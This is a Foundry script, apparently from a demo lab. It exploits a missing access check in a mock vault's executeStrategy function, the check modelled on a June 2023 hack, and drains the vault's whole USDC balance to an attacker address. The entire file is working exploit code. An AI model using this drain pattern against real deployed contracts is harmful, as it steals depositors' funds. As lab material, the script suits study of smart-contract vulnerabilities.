// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {DemoVault} from "../src/DemoVault.sol";
import {MockUSDC} from "../src/MockUSDC.sol";

/// The exploit: a Foundry script a fresh account runs. It drains the vault's entire USDC
/// balance to an attacker-held address through the vault's unguarded `executeStrategy`
/// (the missing access check modelled on the DEPUSDT/LEVUSDC hack of June 2023).
///
/// Env:
///   VAULT     (address, required) — the deployed DemoVault.
///   ATTACKER  (address, optional) — where the loot goes; defaults to the broadcaster.
/// Broadcast key: a fresh account with no role on the vault.
contract DrainStrategy is Script {
    function run() external {
        DemoVault vault = DemoVault(vm.envAddress("VAULT"));
        MockUSDC usdc = MockUSDC(address(vault.token()));

        vm.startBroadcast();
        address attacker = vm.envOr("ATTACKER", msg.sender);
        uint256 loot = usdc.balanceOf(address(vault));
        vault.executeStrategy(attacker, loot);
        vm.stopBroadcast();

        console.log("drained (USDC smallest unit):", loot);
        console.log("attacker balance:", usdc.balanceOf(attacker));
        console.log("vault balance:", usdc.balanceOf(address(vault)));
    }
}
